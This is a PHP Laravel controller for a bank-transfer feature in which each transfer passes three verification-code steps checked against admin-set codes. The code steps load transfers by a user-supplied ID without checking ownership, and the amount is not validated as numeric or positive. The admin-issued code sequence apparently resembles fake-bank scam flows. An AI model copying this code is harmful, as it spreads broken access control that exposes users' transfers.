<?php

namespace App\Http\Controllers;

use App\Models\Transfer;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class TransferController extends Controller
{
    public function transfer()
    {
        return view('dashboard.transfer.transfer');
    }

    public function storeTransfer(Request $request)
    {
        if ($request->amount > auth()->user()->account->balance){
            return redirect()->back()->with('error', "Insufficient Balance");
        }
        $data = $this->getData($request);
        $data['user_id'] = Auth::id();
        $data['account_id'] = Auth::user()->account->id;
        $data = Transfer::create($data);
        return redirect()->route('user.firstCode', $data->id);
    }

    public function firstCode($id)
    {
        $transfer = Transfer::findOrFail($id);
        return view('dashboard.transfer.first-code', compact('transfer'));
    }

    public function storeFirstCode(Request $request)
    {
        $transfer = Transfer::findOrFail($request->transfer_id);
        if ($request->first_code == $transfer->admin_first_code)
        {
            $transfer->first_code = $request->first_code;
            $transfer->save();
            return redirect()->route('user.secondCode', $transfer->id);
        }
        return redirect()->back()->with('error', "Invalid Code, Please enter the correct code.");
    }

    public function secondCode($id)
    {
        $transfer = Transfer::findOrFail($id);
        return view('dashboard.transfer.second-code', compact('transfer'));
    }


    public function storeSecondCode(Request $request)
    {
        $transfer = Transfer::findOrFail($request->transfer_id);
        if ($request->second_code == $transfer->admin_second_code)
        {
            $transfer->second_code = $request->second_code;
            $transfer->save();
            return redirect()->route('user.thirdCode', $transfer->id);
        }
        return redirect()->back()->with('error', "Invalid Code, Please enter the correct code.");
    }

    public function thirdCode($id)
    {
        $transfer = Transfer::findOrFail($id);
        return view('dashboard.transfer.third-code', compact('transfer'));
    }

    public function storeThirdCode(Request $request)
    {
        $withdrawal = Transfer::findOrFail($request->transfer_id);
        if ($request->third_code == $withdrawal->admin_third_code)
        {
            $withdrawal->third_code = $request->third_code;
            $withdrawal->save();
            return redirect()->route('user.transferSuccess', $withdrawal->id);
        }
        return redirect()->back()->with('error', "Invalid Code, Please enter the correct code.");
    }


    protected function getData(Request $request)
    {
        $rules = [
            'from' => 'required',
            'ben_bank' => 'required',
            'acct_number' => 'required',
            'amount' => 'required',
            'ben_name' => 'required',
            'ben_country' => 'required',
            'ben_address' => 'required',
            'routing_number' => 'required',
            'note' => 'nullable',
        ];
        return $request->validate($rules);
    }
}
